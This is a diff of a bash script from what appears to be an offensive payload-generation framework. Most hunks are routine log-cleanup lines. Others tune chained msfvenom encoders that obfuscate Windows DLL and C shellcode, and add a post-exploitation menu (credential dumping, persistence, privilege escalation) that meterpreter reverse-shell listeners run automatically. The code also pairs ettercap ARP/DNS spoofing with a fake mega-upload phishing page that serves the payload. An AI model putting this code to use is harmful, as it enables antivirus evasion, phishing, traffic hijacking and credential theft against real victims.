@@ -454,6 +454,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
+          sed -i "s/\[1m\[31m//g" final.log  
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -499,6 +500,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -525,6 +527,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -681,6 +684,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
+          sed -i "s/\[1m\[31m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -754,6 +758,7 @@ fi
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -780,6 +785,7 @@ fi
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -847,7 +853,7 @@ cat << !
 
 # use metasploit to build shellcode
 # new obfuscating method
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -a x86 --platform windows -e x86/countdown -i 8 -f raw | msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 7 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f dll > $IPATH/output/$N4m.dll"
+xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -a x86 --platform windows -e x86/countdown -i 7 -f raw | msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 6 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 7 -f dll > $IPATH/output/$N4m.dll"
 echo ""
 echo "[☠] editing/backup files..."
 cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
@@ -885,6 +891,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
+          sed -i "s/\[1m\[31m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -958,6 +965,7 @@ fi
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -983,6 +991,7 @@ fi
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -1109,6 +1118,7 @@ ans=$(zenity --list --title "☠ EXECUTABLE FORMAT ☠" --text "\nChose what to 
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
+         sed -i "s/\[1m\[31m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
@@ -1149,6 +1159,7 @@ ans=$(zenity --list --title "☠ EXECUTABLE FORMAT ☠" --text "\nChose what to 
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
+         sed -i "s/\[1m\[31m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
@@ -1198,6 +1209,7 @@ ans=$(zenity --list --title "☠ EXECUTABLE FORMAT ☠" --text "\nChose what to 
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
+           sed -i "s/\[1m\[31m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
@@ -1262,7 +1274,7 @@ cat << !
 !
 
 # use metasploit to build shellcode (msf encoded)
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -a x86 --platform windows -e x86/countdown -i 8 -f raw | msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 7 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f c > $IPATH/output/chars.raw"
+xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -a x86 --platform windows -e x86/countdown -i 7 -f raw | msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 6 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 8 -f c > $IPATH/output/chars.raw"
 
 echo ""
 # display generated code
@@ -1349,6 +1361,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
+           sed -i "s/\[1m\[31m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
@@ -1436,6 +1449,7 @@ fi
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -1462,6 +1476,7 @@ fi
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -1605,6 +1620,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
+          sed -i "s/\[1m\[31m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -1691,6 +1707,7 @@ fi
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -1717,6 +1734,7 @@ fi
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -1843,6 +1861,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
+          sed -i "s/\[1m\[31m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -1885,6 +1904,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -1910,6 +1930,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -2008,6 +2029,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
+          sed -i "s/\[1m\[31m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -2096,6 +2118,7 @@ fi
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -2122,6 +2145,7 @@ fi
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -2257,6 +2281,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
+          sed -i "s/\[1m\[31m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -2344,6 +2369,7 @@ fi
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -2370,6 +2396,7 @@ fi
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -2514,6 +2541,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
+          sed -i "s/\[1m\[31m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -2554,6 +2582,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -2580,6 +2609,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -2708,6 +2738,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
+          sed -i "s/\[1m\[31m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -2754,6 +2785,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -2780,6 +2812,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -2895,6 +2928,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
+          sed -i "s/\[1m\[31m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -2981,6 +3015,7 @@ fi
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -3008,6 +3043,7 @@ fi
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -3100,6 +3136,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "PAYLOAD STORE
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
+         sed -i "s/\[1m\[31m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
@@ -3142,6 +3179,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "PAYLOAD STORE
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -3168,6 +3206,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "PAYLOAD STORE
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -3289,6 +3328,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
+          sed -i "s/\[1m\[31m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -3376,6 +3416,7 @@ fi
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -3402,6 +3443,7 @@ fi
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -3556,6 +3598,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
+          sed -i "s/\[1m\[31m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -3642,6 +3685,7 @@ fi
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -3669,6 +3713,7 @@ fi
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -3733,6 +3778,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
+          sed -i "s/\[1m\[31m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -3820,6 +3866,7 @@ fi
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -3847,6 +3894,7 @@ fi
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -3962,6 +4010,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STOR
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
+         sed -i "s/\[1m\[31m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
@@ -4073,6 +4122,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STOR
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
+         sed -i "s/\[1m\[31m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
@@ -4213,6 +4263,7 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -4239,6 +4290,7 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -4369,6 +4421,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
+          sed -i "s/\[1m\[31m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -4377,9 +4430,13 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
         fi
       sleep 2
 
+
    else
 
-      N4m=$(zenity --title="☠ SFX Infection ☠" --text "WARNING: to use SFX attack vector: $N4m.py\nneeds to be compressed into one WinRAR/SFX\n\nexample: output.exe" --entry --width 360) > /dev/null 2>&1
+
+# post-exploitation
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" --width 305 --height 340) > /dev/null 2>&1
+
       # edit files nedded
       cd $IPATH/templates/phishing
       cp $InJEc12 mega[bak].html
@@ -4396,13 +4453,14 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
         sed "s|NaM3|$N4m|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
         cp $IPATH/output/$N4m $ApAcHe/$N4m
         echo "- ATTACK VECTOR: http://mega-upload.com"
+        echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -4410,11 +4468,12 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           fi
 
 
@@ -4422,13 +4481,14 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
 
 
         echo "- ATTACK VECTOR: http://$lhost"
+        echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
             tr -cd '\11\12\15\40-\176' < report.log > final.log
@@ -4436,11 +4496,12 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
           fi
         fi
    fi
@@ -4524,6 +4585,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -4567,6 +4629,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -4593,6 +4656,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -4673,6 +4737,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
+         sed -i "s/\[1m\[31m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
@@ -4716,6 +4781,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -4742,6 +4808,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
             sed -i "s/\[1m\[34m//g" final.log
             sed -i "s/\[4m//g" final.log
             sed -i "s/\[K//g" final.log
+            sed -i "s/\[1m\[31m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -4840,17 +4907,18 @@ sed "s/SRVHOST/$srvhost/g" web_delivery.py > $filename.py
 mv $filename.py $IPATH/output/$filename.py
 chmod +x $IPATH/output/$filename.py
 
-# winrar/sfx trigger
-cUe=`echo $filename.py | cut -d '.' -f1`
